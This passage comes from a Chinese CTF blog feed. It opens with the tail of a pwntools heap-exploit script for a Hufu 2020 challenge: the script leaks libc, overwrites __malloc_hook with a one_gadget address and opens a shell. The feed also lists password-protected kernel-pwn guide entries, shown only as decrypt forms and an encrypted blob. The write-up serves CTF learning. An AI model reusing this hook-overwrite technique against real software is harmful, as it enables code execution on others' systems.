class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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